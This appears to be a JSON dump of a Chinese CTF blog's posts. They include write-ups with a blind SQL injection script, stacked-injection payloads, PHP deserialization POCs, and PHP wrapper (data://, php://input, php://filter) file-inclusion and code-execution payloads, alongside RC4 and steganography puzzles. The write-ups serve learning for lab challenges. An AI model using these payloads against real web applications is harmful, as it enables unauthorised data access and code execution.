实例：User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.11) Gecko/20071127 Firefox/2.0.0.11 用bp抓包修改一下，得到了另外一个页面 a.php You can only read this at local! Your address117.136.75.112 这里要自己添加、并修改X-Forwarded-For的值。 X-Forwarded-For 是一个 HTTP 扩展头部，用来表示HTTP请求端真实 IP，HTTP/1.1 协议并没有对它的定义，但现如今 X-Forwarded-For已被各大 HTTP 代理、负载均衡等转发服务广泛使用。 X-Forwarded-For 作为 HTTP 请求的扩展头，在请求的过程中可以被直接的进行修改。正常情况下，我们所获得的 ips 第一部分应该是 客户端 IP，但是如果客户端对 X-Forwarded-For 进行了修改，我们仍旧采用以上方法获得客户端 IP，那么客户端 IP 将会是被伪造过的。 （3）进入第三个页面后得到flag。","tags":[{"name":"题目","slug":"题目","permalink":"http://example.com/tags/%E9%A2%98%E7%9B%AE/"}]},{"title":"swpuctf_2021简简单单的解密","date":"2022-07-08T11:52:58.000Z","path":"2022/07/08/swpuctf-2021简简单单的解密/","text":"swpuctf_2021简简单单的解密（re4加密）（1）前言 不会全栈的ctfer，不是一名合格的ctfer。 （2）题目 附件内容： import base64,urllib.parse key = &quot;HereIsFlagggg&quot; flag = &quot;xxxxxxxxxxxxxxxxxxx&quot; s_box = list(range(256)) j = 0 for i in range(256): j = (j + s_box[i] + ord(key[i % len(key)])) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] res = [] i = j = 0 for s in flag: i = (i + 1) % 256 j = (j + s_box[i]) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] t = (s_box[i] + s_box[j]) % 256 k = s_box[t] res.append(chr(ord(s) ^ k)) cipher = &quot;&quot;.join(res) crypt = (str(base64.b64encode(cipher.encode(&#39;utf-8&#39;)), &#39;utf-8&#39;)) enc = str(base64.b64decode(crypt),&#39;utf-8&#39;) enc = urllib.parse.quote(enc) print(enc) # enc = %C2%A6n%C2%87Y%1Ag%3F%C2%A01.%C2%9C%C3%B7%C3%8A%02%C3%80%C2%92W%C3%8C%C3%BA 这里运用的是re4加密，re4加密一般可以分成三部： a.初始化S和T s_box = list(range(256)) j = 0 for i in range(256): j = (j + s_box[i] + ord(key[i % len(key)])) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] b.初始排列S res = [] i = j = 0 for s in flag: i = (i + 1) % 256 j = (j + s_box[i]) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] c.生成密钥流 t = (s_box[i] + s_box[j]) % 256 k = s_box[t] res.append(chr(ord(s) ^ k)) 不过这种加密方式是同过明文与生成的密钥流进行异或而得到密文，因此我们就可以通过让密文与密钥流再次异或得到明文（异或两次得到的还是原来的数）。 不过这题生成密文后先base64加密后在解密有点看不懂，接着在用urllib.parse.quote（）函数对密文进行url编码，因此我们只需要先对密文进行url解码，在与密钥流异或一次就行了。 (3)脚本 import base64,urllib.parse key = &quot;HereIsFlagggg&quot; flag = &#39;&#39; enc = &quot;%C2%A6n%C2%87Y%1Ag%3F%C2%A01.%C2%9C%C3%B7%C3%8A%02%C3%80%C2%92W%C3%8C%C3%BA&quot; enc = urllib.parse.unquote(enc) s_box = list(range(256)) j = 0 for i in range(256): j = (j + s_box[i] + ord(key[i % len(key)])) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] res = [] i = j = 0 for s in range(len(enc)): i = (i + 1) % 256 j = (j + s_box[i]) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] t = (s_box[i] + s_box[j]) % 256 k = s_box[t] for ff in range(32,128): if(chr(ff ^ k) == enc[s]): print(chr(ff),end=&#39;&#39;) # NSSCTF&#123;REAL_EZ_RC4&#125; （4）补充 RC4的定义： 在密码学中，RC4（来自Rivest Cipher4的缩写）是一种流加密算法，密钥长度可变。它加解密使用相同的密钥，因此也属于对称加密算法。RC4是有线等效加密（WEP）中采用的加密算法,从明文输入流逐位或逐字节产生密文。 流密码类似于”一次一密”，不同的是”一次一密”使用的是真正的随机数流，而流密码使用的是伪随机数流。 流密码结构： 设计流密码的主要因素: 1、加密序列的周期要长，若出现重复的周期过短，容易被破解. 2、密钥流应该尽可能地接近真正随机数流的特征. 3、密钥长度要长，以避免琼穷举攻击.","tags":[{"name":"题目","slug":"题目","permalink":"http://example.com/tags/%E9%A2%98%E7%9B%AE/"}]},{"title":"漏洞","date":"2022-07-07T13:02:51.000Z","path":"2022/07/07/漏洞/","text":"说明","tags":[]},{"title":"ciscn2019_hack_world","date":"2022-07-07T09:44:36.000Z","path":"2022/07/07/ciscn2019-hack-world/","text":"ciscn2019_hack_world(1)前言 好久没有做sql注入的题目了，找一道做一下 (2)题目 测试了一下应该是盲注，发现空格，and,&amp;,|等一些常用的方法被过滤掉了，但是发现了我们可以用0^1或用if(1=1,1,1)这两种办法。 (3)构造payload，题目把表名和列名告诉我们了可以省的爆破。 payload = &quot;0^(ascii((substr((select(flag)from(flag)),%d,1)))&gt;%d)&quot; % (i, mid) 不过由于是盲注，这就需要我们用到脚本 import requests import time flag = &quot;&quot; for i in range(1, 60): high = 128 low = 32 mid = (high + low) &gt;&gt; 1 while low &lt; high: url = &quot;http://1.14.71.254:28374/index.php&quot; # payload = &quot;0^(ascii((substr(database(),%d,1)))&gt;%d)&quot; % (i, mid) payload = &quot;0^(ascii((substr((select(flag)from(flag)),%d,1)))&gt;%d)&quot; % (i, mid) data1 = &#123;&#39;id&#39;: payload&#125; # print(url) r = requests.post(url, data=data1) # time.sleep(0.01) if &quot;Hello&quot; in r.text: low = mid + 1 else: high = mid mid = (high + low) &gt;&gt; 1 if mid == 32 or mid == 127: break flag += chr(mid) print(flag) print(&quot;最终结果：&quot; + flag) 爆出flag：NSSCTF{11f51a15-6faf-464d-87a4-d04097fd7b33}","tags":[{"name":"题目","slug":"题目","permalink":"http://example.com/tags/%E9%A2%98%E7%9B%AE/"}]},{"title":"sdctf2022_Ishihara_test++","date":"2022-06-20T16:17:11.000Z","path":"2022/06/21/sdctf2022_Ishihara_test++/","text":"sdctf2022_Ishihara_test++（1）前言 考试月，太忙了，赶紧找点题目来水水博客。 （2）题目描述： I don’t think the person who made this knew what they were doing. Aren’t you supposed to see some kind of number or something in the middle? 我认为制作这个的人不知道他们在做什么。你不应该在中间看到一些数字吗？ （3）根据题目的描述，即flag应该在这张图片的中间，用txt打开，发现这张图是由，c1~c6一共6中颜色的圆，而且每一个圆的大小一般都不同，其实这6种颜色十分相近，如果仅看成颜色则意义不大，所以我们猜测flag与这6种有关。 c1&#123;fill:#89a1d1;&#125;.c2&#123;fill:#89a1d2;&#125;.c3&#123;fill:#89a1d3;&#125;.c4&#123;fill:#89a1d4;&#125;.c5&#123;fill:#89a1d5;&#125;.c6&#123;fill:#89a1d6;&#125; 我们最后要得到的flag在图片中间，那么我们可以删掉一下点，得到我们想要的。我们对c1~c6进行排序，一共有2^6，即64种情况，我们进行尝试。最后发现在C1-C3-C6这1种情况下可以得到flag。 （4）脚本 #!/usr/bin/env python3 header = &#39;&#39;&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt; &lt;svg width=&quot;1920&quot; height=&quot;1080&quot; viewBox=&quot;0 0 1920 1080&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot;&gt;&#39;&#39;&#39; footer = &#39;&lt;/svg&gt;&#39; c = [] with open(&quot;flag.svg&quot;, &quot;r&quot;) as f: content = f.read().split(&#39;\\n&#39;) for i in content: if &quot;c1&quot; in i: c.append(i) # if &quot;c2&quot; in i: # c.append(i) if &quot;c3&quot; in i: c.append(i) # if &quot;c4&quot; in i: # c.append(i) # if &quot;c5&quot; in i: # c.append(i) if &quot;c6&quot; in i: c.append(i) with open(&quot;flag1.svg&quot;, &quot;w&quot;) as f: f.write(f&quot;&#123;header&#125;\\n&quot;) for i in c: f.write(f&quot;&#123;i&#125;\\n&quot;) f.write(f&quot;&#123;footer&#125;&quot;) （5）结果 sdctf&#123;c0untle55_col0rfu1-c0lors_cov3ring_3veryth1ng&#125;","tags":[{"name":"题目","slug":"题目","permalink":"http://example.com/tags/%E9%A2%98%E7%9B%AE/"}]},{"title":"ISCC-2022（部分wp）","date":"2022-05-12T12:52:01.000Z","path":"2022/05/12/ISCC-2022（部分wp）/","text":"ISCC-2022（部分wp）web冬奥会 （1）码源 &lt;?php show_source(__FILE__); $Step1=False; $Step2=False; $info=(array)json_decode(@$_GET[&#39;Information&#39;]); if(is_array($info))&#123; var_dump($info); is_numeric(@$info[&quot;year&quot;])?die(&quot;Sorry~&quot;):NULL; if(@$info[&quot;year&quot;])&#123; ($info[&quot;year&quot;]=2022)?$Step1=True:NULL; &#125; if(is_array(@$info[&quot;items&quot;]))&#123; if(!is_array($info[&quot;items&quot;][1])OR count($info[&quot;items&quot;])!==3 ) die(&quot;Sorry~&quot;); $status = array_search(&quot;skiing&quot;, $info[&quot;items&quot;]); $status===false?die(&quot;Sorry~&quot;):NULL; foreach($info[&quot;items&quot;] as $key=&gt;$val)&#123; $val===&quot;skiing&quot;?die(&quot;Sorry~&quot;):NULL; &#125; $Step2=True; &#125; &#125; if($Step1 &amp;&amp; $Step2)&#123; include &quot;2022flag.php&quot;;echo $flag; &#125; ?&gt; （2）用JSON格式的字符串对information传值，里面要求year=2022，并且2022不能为数字，可以用%20绕过，items是个数为3数组，intems[1]也为数组，并且in_array()函数的解释是bool in_array ( mixed needle,arrayhaystack [, bool strict=FALSE]),如果strict参数没有提供或者是false(true会进行严格的过滤)，那么inarray就会使用松散比较来判断needle是否在$haystack中，利用函数接入到了不符合的类型返回“0”这个特性，直接绕过检测。所有让items[1]或items[3]其中一个为0即可。 payload：?Information=&#123;&quot;year&quot;:&quot;2022 &quot;,&quot;items&quot;:[1,[1],0]&#125; Pop2022这题其实和nss有一题是完全一样的，套一下payload就出来了 findme（1）F12查看源代码，得到另外一个页面 （2）看到码源想到原生类 （3）先用DirectoryIterator指令找一下flag data=O:1:&quot;a&quot;:5:&#123;s:3:&quot;un0&quot;;s:17:&quot;DirectoryIterator&quot;;s:3:&quot;un1&quot;;s:23:&quot;glob:///var/www/html/f*&quot;;s:3:&quot;un2&quot;;N;s:3:&quot;un3&quot;;s:11:&quot;unserialize&quot;;s:3:&quot;un4&quot;;N;&#125; Your output: fSSsybePonk_FIndMe.txt，还好没有直接输flag，不然还真的找不出来。 然后再用SplFileObject指令读取， &#123;s:3:&quot;un0&quot;;s:13:&quot;SplFileObject&quot;;s:3:&quot;un1&quot;;s:36:&quot;/var/www/html/fSSsybePonk_FIndMe.txt&quot;;s:3:&quot;un2&quot;;N;s:3:&quot;un3&quot;;s:11:&quot;unserialize&quot;;s:3:&quot;un4&quot;;N;&#125; flag就出来了 （4）构建的poc poc： &lt;?php class a&#123; public $un0 = &#39;SplFileObject&#39;; public $un1 = &quot;/var/www/html/fSSsybePonk_FIndMe.txt&quot;; public $un2; public $un3= &#39;unserialize&#39;; //= &#39;unserialize&#39;; public $un4; public function __destruct()&#123; if(!empty($this-&gt;un0) &amp;&amp; empty($this-&gt;un2))&#123; $this -&gt; Givemeanew(); if($this -&gt; un3 === &#39;unserialize&#39;)&#123; $this -&gt; yigei(); &#125; else&#123; $this -&gt; giao(); &#125; &#125; &#125; public function Givemeanew()&#123; $this -&gt; un4 = new $this-&gt;un0($this-&gt; un1); //123;//$this -&gt; un2 =&quot;;echo success;&quot; &#125; public function yigei()&#123; echo &#39;Your output: &#39;.$this-&gt;un4; &#125; public function giao()&#123; @eval($this-&gt;un2); &#125; public function __wakeup()&#123; include $this -&gt; un2.&#39;hint.php&#39;; &#125; &#125; $data = new a(); $b=serialize($data); echo serialize($data); unserialize($b); misc单板小将苏翊鸣（1）一张图片和一个加密的压缩包用101edit打开，发现CRC报错，猜测可能是图片的宽高被修改，改一下高，爆了一个二维码。 （2）扫一下，得到Unicode码，解一下\\u5728\\u8fd9\\u6b21\\u51ac\\u5965\\u4f1a\\u7684\\u821e\\u53f0\\u4e0a\\uff0c\\u6211\\u56fd\\u5c0f\\u5c06\\u82cf\\u7fca\\u9e23\\u65a9\\u83b7\\u4e00\\u91d1\\u4e00\\u94f6\\uff0c\\u90a3\\u4f60\\u77e5\\u9053\\u6b64\\u6b21\\u51ac\\u5965\\u4f1a\\u6211\\u56fd\\u603b\\u5171\\u83b7\\u5f97\\u51e0\\u679a\\u5956\\u724c\\u5417\\uff1f\\u53c8\\u5206\\u522b\\u662f\\u51e0\\u91d1\\u51e0\\u94f6\\u51e0\\u94dc\\u5462\\uff1f在这次冬奥会的舞台上，我国小将苏翊鸣斩获一金一银，那你知道此次冬奥会我国总共获得几枚奖牌吗？又分别是几金几银几铜呢？15942 （3）打开压缩包，就有flag。 2022冬奥会和上一题一个思路，同样是改一下高度，爆出Unicode码，截屏识别一下，问你雪融融原型是什么。 灯笼，打开压缩包，有一张损坏的图片，用101打开一下，就有flag。 藏在星空中的诗-1（1）有个文本和一张图片和一个加密的压缩包 用ps打开图片，发现有两个图层，其中一个透明度很低，改高点，有一个五角星。 （2）按顺序把文本里的星星符号粘贴到压缩包，得到一个pdf文件，在按pdf文件一个个对应星星图案翻译出flag。 藏在星空中的诗-2（1）先把txt的文本用，星星1的表格对照一下 \\QTTPU\\QTTED\\QTTPD\\QTTPD\\QTTKB\\QTTPR\\QTTDE\\QTT=B\\QTTEK\\QTTET\\QTTFO\\QTTPO\\QTTEP\\QTTPK\\QTTFI\\QTTK=\\QTTKK\\QTTPT\\QTT=P\\QTTKH （2）把重复的去掉 \\PU\\ED\\PD\\PD\\KB\\PR\\DE=B\\EK\\ET\\FO\\PO\\EP\\PK\\FI\\K=\\KK\\PT=P\\KH 感觉应该是Unicode码。 \\PU\\ED\\PD\\PD有两个pd对于的应该是ISCC。 （3）回到对照表，找了好久才发现，要用星星图案对应的Unicode码取最后一位拼接起来。 \\u0049\\u0053\\u0043\\u0043\\u007b\\u004c\\u0035\\u002b\\u0057\\u0050\\u006f\\u004f\\u0054\\u0047\\u0061\\u0072\\u0077\\u0040\\u0024\\u007d （4）在用Unicode转码一下，就有flag。 真相只有一个（1）一张图片，一个txt，一个stram 图片不知道是用来干什么的，先放一边。 （2）看了看stream好像缺了文件头，改一下，后缀顺便改成zip，好像有加密，先用ziperello爆破一下zip，跑出密码19981111，这好像要去图片里找，没想到提前出来了。 （3）解压缩包，得stram文件，wireshark打开，找到了一个MP3文件，导出来，在password.mp3最后听出了一段摩斯密码 解出来是isccmisc （4）看txt里的内容加密的方式应该是snow加密，配合上面解出来的密码，用snow.exe，解密一下。 得到一串这个玩意，QUmu-U6LP-Gcto 套进ISCC{}看看，好像可以。 whereistheflag博主太菜了，开始的时候也有试过lsb隐写，rgb000也看过很多次，就愣是看不出有问题。后面看大佬的wp才知道，真的有问题。 （1）先把题目的那一串base64码解密一下，解开压缩包。 （2）用stegsolve里的lsb隐写 提取出最前面一段的十六进制码（我就为什么看不出来呢） ffffd254d0d0dedc90de569bdc1a0cd5cd1893921bd89c118dd9145f41f8007ffffc7e3fe00fff0071ffff （3）把上面的码转为二进制 由于0~127位前面的ascii码是由00000000到01111111，因此转码出来后把第一个0前面的东西都删掉。每八位对应一个字符。 01001001 01010011 01000011 01000011 01111011 01110010 01000011 01111001 01011010 01101111 01110000 01101000 00110011 01010111 00110100 01100010 01001110 01001000 01101111 01100010 01110000 01000110 00110111 01100100 01010001 01111101 00000111 后面由以1开头的则去掉，弄好后转成ASCII码对应的字符就行了。","tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]},{"title":"神奇的Unicode编码_强制改变选中顺序","date":"2022-04-24T14:01:54.000Z","path":"2022/04/24/神奇的Unicode编码-强制改变选中顺序/","text":"（1）前言 博主刷题时瞬间懵了，尽然卡在一道签到题。等等，这选中是什么东西。 （2）题目 就一个简单的传参题。 （3）分析由于源码有点猫腻，我们先是打开了码源进行分析，发现这个问题仍然存在。那就往更底层看看。 我们可以发现在通过十六进制转换后整个代码变了很多，其中多了很多奇奇怪怪的符号。 //翻译一下 E2 80 AE â€® E2 81 A6 â 20 46 6C 61 67 21 Flag! E2 81 A9 â E2 81 A6 â 4E 31 53 41 43 54 46 N1SACTF E2 80 AE â€® E2 81 A6 â 55 67 65 69 77 6F E2 Ugeiwo E2 81 A9 â E2 81 A6 â 63 75 69 73 68 69 79 75 61 6E cuishiyuan 可以发现这问题的关键在于E2 80 AE，E2 81 A6，E2 81 A9，这里面。 E2 80 AE E2 81 A6 20 46 6C 61 67 21 E2 81 A9 E2 81 A6 4E 31 53 41 43 54 46 E2 80 AE E2 81 A6 55 67 65 69 77 6F E2 81 A9 E2 81 A6 63 75 69 73 68 69 79 75 61 6E （4）百度一下 1.从右至左强制：U+202E（UTF-8 E2 80 AE）Unicode名称 Right-To-Left Override 作用：根据内存顺序从右至左显示字符。 2.從左到右隔離：U+2066（UTF-8 E2 81 A6）Unicode名称 Left-To-Right Isolate 作用：这之间的字符从左到右显示，不影响外围字符。 3.流行定向隔離：U+2069（UTF-8 E2 81 A9）Unicode名称 Pop Directional Isolate 作用：作为RLI、LRI、FSi翻转结束的标识 eg：HelloCTFer 浏览器进行解析的时候，自然是按照上方十六进制的顺序进行解析，但是解析并不代表着输出，浏览器的输出结果需要根据底层字符的含义进行输出，当浏览器看到E280AE时，就知道后面的字符需要从右到左显示，而解析到E281A6时，浏览器就会知道将后面的字符从左往右输出，也就是CTFer输出结果仍然为CTFer而不是reFTC。当浏览器按照这样的规则把Hello解析完成之后，便会根据E280AE的从右往左输出的原则，将CTFer与Hello两个交换顺序，最终我们在浏览器中看到的结果便是HelloCTFer。 即使输出的结果是HelloCTFer，符合我们的认知，但是当我们用鼠标进行拖动的时候，电脑还是会那么贴心的帮我们把特殊符号加上，导致我们拖动Hello的时候，CTFer也被选中了 （5）构造payload 也就是说我们在复制的时候复制的是被符号转变后的字符，那么我们只要传入对应的hex的值，即还没进行转移的值就可以了。 payload: http://1.14.71.254:28518/?ahahahaha=jitanglailo&amp;%E2%80%AE%E2%81%A6%55%67%65%69%77%6F%E2%81%A9%E2%81%A6%63%75%69%73%68%69%79%75%61%6E=%E2%80%AE%E2%81%A6%20%46%6C%61%67%21%E2%81%A9%E2%81%A6%4E%31%53%41%43%54%46 （6）爆出flag。","tags":[{"name":"笔记","slug":"笔记","permalink":"http://example.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"php支持的协议和封装协议","date":"2022-04-19T03:07:00.000Z","path":"2022/04/19/php支持的协议和封装协议/","text":"#php支持的协议和封装协议（主要是php伪协议）# 1 data://协议（1）data://协议必须双在on才能正常使用； allow_url_fopen ：on allow_url_include：on 封装协议摘要 属性 支持 受限于allow_url_fopen No 受限于allow_url_include Yes 允许读取 Yes 允许写入 No 允许追加 No 允许同时读写 No 支持stat() No 支持unlink() No 支持rename() No 支持mkdir() No 支持rmdir() No （2）格式： http://127.0.0.1/code/1.php?file=data://text/plain,&lt;?php phpinfo()?&gt; http://127.0.0.1/code/1.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4= $data=&#39;Günther says: 1+1 is 2, 10%40 is 20.&#39;; $fp = fopen(&#39;data:text/plain,&#39;.urlencode($data), &#39;rb&#39;); // urlencoded data echostream_get_contents($fp); $fp = fopen(&#39;data:text/plain;base64,&#39;.base64_encode($data), &#39;rb&#39;); // base64 encoded data echostream_get_contents($fp); 注：不要直接传输原数据，特别是在数据中存在+时，因为PHP会自动对传递的字符串中的所有实体进行urldecode，+在此步骤时丢失我么需要urlencode（）或者base64_encode（）转码在传输 （3）用法：自PHP&gt;=5.2.0起，可以使用data://数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。一般需要用到base64编码传输。 可以用来绕过file_get_contents()函数，file_get_contents — 将整个文件读入一个字符串。其中如果传入的值为网址，则获取并输出网站首页 HTML 源码。 ##2 php://协议 ## （1）封装协议摘要（针对 php://filter，参考被筛选的封装器） 受限于allow_url_fopen No 受限于allow_url_include 仅 php://input、 php://stdin、 php://memory 和 php://temp。 允许读取 仅 php://stdin、 php://input、 php://fd、 php://memory 和 php://temp。 允许写入 仅 php://stdout、 php://stderr、 php://output、 php://fd、 php://memory 和php://temp。 允许追加 仅 php://stdout、 php://stderr、 php://output、 php://fd、 php://memory 和php://temp（等于写入） 允许同时读写 仅 php://fd、 php://memory 和 php://temp。 支持 stat() 仅 php://memory 和 php://temp。 支持 unlink() No 支持 rename() No 支持 mkdir() No 支持 rmdir() No 仅仅支持 stream_select() php://stdin、 php://stdout、 php://stderr、 php://fd 和 php://temp。 不需要开启allow_url_fopen，仅php://input、 php://stdin、 php://memory 和 php://temp 需要开启allow_url_include。php://stdin, php://stdout 和 php://stderr、php://stdin、php://stdout 和 php://stderr 允许直接访问 PHP 进程相应的输入或者输出流。php://stdin 是只读的， php://stdout 和 php://stderr 是只写的。 php://filter在双off的情况下也可以正常使用； allow_url_fopen ：off/on allow_url_include：off/on 注：php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。 （2）格式 php://filter http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode/resource=./xx.php //输出xx.php的base64的值 php://input http://127.0.0.1/cmd.php?file=php://input post传值：&lt;?php phpinfo()?&gt;//php代码，即用来执行PHP代码 来个data://协议与php://协议的题目（1）[ZJCTF 2019]NiZhuanSiWei &lt;?php $text = $_GET[&quot;text&quot;]; $file = $_GET[&quot;file&quot;]; $password = $_GET[&quot;password&quot;]; if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;))&#123; echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file))&#123; echo &quot;Not now!&quot;; exit(); &#125;else&#123; include($file); //useless.php $password = unserialize($password); echo $password; &#125; &#125; else&#123; highlight_file(__FILE__); &#125; ?&gt; （2）绕过file_get_contents函数 我们可以用PHP伪协议中的php://input（将post请求中的数据作为PHP代码执行）或者data://（写入协议）对text参数传入welcome to the zjctf payload：?text=data://text/plain,welcome%20to%20the%20zjctf （3）利用php://filter协议读取useless.php看看提示 payload：?text=data://text/plain,welcome to the zjctf&amp;file=php://filter/read=convert.base64-encode/resource=useless.php 得到了一串base64的码。 PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo= 解码得： &lt;?php class Flag&#123; //flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); &#125; &#125; &#125; ?&gt; 又有一段代码。。。。 （4）我们需要运用上面的file_get_contents来对flag.php文件进行读取，但file的值又不能有flag。这时我们可以先用include()函数对要用到的文件useless.php进行包含，即让file=useless.php，这样同时也可以绕过正则匹配。 在对password传值,并利用echo 函数会触发tostring魔术方法，而在此方法中有file get contents函数，只传flag进去发现不行，因此传伪协议进去,出flag。 序列化一下 &lt;?php class Flag&#123; //flag.php public $file=&quot;flag.php&quot;; &#125; echo serialize(new Flag); ?&gt; //输出 O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 构造payload： ?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; （5）爆出flag 输入payload的得到以上界面，查看一下源代码得到flag。 注：tostring魔术方法 echo一个对象的时候自动调用该方法。 &lt;?php error_reporting(0); class A&#123; //flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo $this-&gt;file; echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); &#125; &#125; &#125; $p = &#39;O:1:&quot;A&quot;:1:&#123;s:4:&quot;file&quot;;s:3:&quot;123&quot;;&#125;&#39;; $p = unserialize($p); echo $p; ?&gt; 3 file://协议（1）条件 file:// 协议在双off的情况下也可以正常使用； allow_url_fopen ：off/on allow_url_include：off/on （2）格式 file:// [文件的绝对路径和文件名] http://127.0.0.1/cmd.php?file=file://D:/soft/phpStudy/WWW/phpcode.txt （3）用法 file:// 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响 4 zip://, bzip2://, zlib://协议zip://, bzip2://, zlib://协议在双off的情况下也可以正常使用； allow_url_fopen ：off/on allow_url_include：off/on zip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。 1、zip:// (1)使用 zip://archive.zip#dir/file.txt zip:// [压缩文件绝对路径]#[压缩文件内的子文件名] http://127.0.0.1/cmd.php?file=zip://D:/soft/phpStudy/WWW/file.jpg%23phpcode.txt 先将要执行的PHP代码写好文件名为xx.txt，将xx.txt进行zip压缩,压缩文件名为file.zip,如果可以上传zip文件便直接上传，若不能便将file.zip重命名为file.jpg后在上传，其他几种压缩格式也可以这样操作。 2、bzip2://协议 （1）使用 compress.bzip2://file.bz2 http://127.0.0.1/cmd.php?file=compress.bzip2://D:/soft/phpStudy/WWW/file.jpg http://127.0.0.1/cmd.php?file=compress.bzip2://./file.jpg 3、zlib://协议 （1）使用 compress.zlib://file.gz http://127.0.0.1/cmd.php?file=compress.zlib://D:/soft/phpStudy/WWW/file.jpg http://127.0.0.1/cmd.php?file=compress.zlib://./file.jpg","tags":[{"name":"笔记","slug":"笔记","permalink":"http://example.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"SWPUCTF2021新生赛_ez_unserialize","date":"2022-04-19T02:35:56.000Z","path":"2022/04/19/SWPUCTF2021新生赛-ez-unserialize/","text":"#SWPUCTF2021新生赛_ez_unserialize# （1）题目 &lt;?php error_reporting(0); show_source(&quot;cl45s.php&quot;); class wllm&#123; public $admin; public $passwd; public function __construct()&#123; $this-&gt;admin =&quot;user&quot;; $this-&gt;passwd = &quot;123456&quot;; &#125; public function __destruct()&#123; if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;ctf&quot;)&#123; include(&quot;flag.php&quot;); echo $flag; &#125;else&#123; echo $this-&gt;admin; echo $this-&gt;passwd; echo &quot;Just a bit more!&quot;; &#125; &#125; &#125; $p = $_GET[&#39;p&#39;]; unserialize($p); ?&gt; php类的相关知识点： https://www.runoob.com/php/php-oop.html （2）这道题主要是要通过对p传值来对passwd经行修改，其中传值要通过序列化传值。 &lt;?php class wllm&#123; public $admin; public $passwd; public function __construct()&#123; $this-&gt;admin =&quot;admin&quot;; $this-&gt;passwd = &quot;ctf&quot;; &#125; &#125; $p= new wllm(); echo serialize($p); ?&gt; //输出 O:4:&quot;wllm&quot;:2:&#123;s:5:&quot;admin&quot;;s:4:&quot;user&quot;;s:6:&quot;passwd&quot;;s:3:&quot;ctf&quot;;&#125; 构造payload：?p=O:4:”wllm”:2:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:3:”ctf”;} （3）爆出flag。","tags":[{"name":"题目","slug":"题目","permalink":"http://example.com/tags/%E9%A2%98%E7%9B%AE/"}]},{"title":"强网杯2019_随便注","date":"2022-03-17T13:01:39.000Z","path":"2022/03/17/强网杯2019-随便注/","text":"强网杯2019_随便注（1）打开页面，先试几个关键词，发现很多关键字被过滤掉了 （2）既然select被过滤掉了，便尝试一下堆叠注入。 好像可以，再试试。 1919810931114514必须用反单引号括起来，但是words不需要，应该是和数据类型有关。 （3）方法 法一： （1）仔细观察，发现查询框里值1的返回值为两个数据，表words中正好存储了两列数据，而1919810931114514表中仅有flag这列数据。据此，我们不妨猜测查询框所查询的值为words表中的值。 查询框后台的语句为：select id,data from words where id= （2）既然查询框是从words表中查询数据，那么我们就可以通过把1919810931114514改为words表，把属性名flag改为id，来查询flag。 （3）改名 1&#39;;rename table `words` to words2; rename table `1919810931114514` to `words`; alter table words change flag id varchar(100); 由于flag更改成id后，里面的值只有flag，我们可以构造1’ or 1=1;永真式来查询flag； 法二： （1）因为select被过滤了，所以先将select * from 1919810931114514进行16进制编码，再通过构造payload得flag。 注：在遇到堆叠注入时，如果select、rename、alter和handler等语句都被过滤的话，我们可以用MySql预处理语句配合concat拼接来执行sql语句拿flag。 预处理语句的SQL语法基于三个SQL语句:（详情可以参考博主《sql注入——预处理语句》这篇博客） 1.PREPARE语句准备执行。 2.EXECUTE执行一条预处理语句。 3.DEALLOCATE PREPARE释放一个预处理语句。 （2）构造payload 1&#39;;sEt @a=concat(&quot;sel&quot;,&quot;ect flag from `1919810931114514`&quot;);PRepare hello from @a;execute hello;# 这里set和prepare都被过滤了，不过过滤使用的函数strstr是区分大小写的我们可以通过大小写绕过。 （3）爆出flag。 法三： （1）这里由于没有过滤handler语句，我们可以通过handler语句来进行查询。 （2）构造payload 1&#39;;handler `1919810931114514` open as `a`;handler `a` read next; 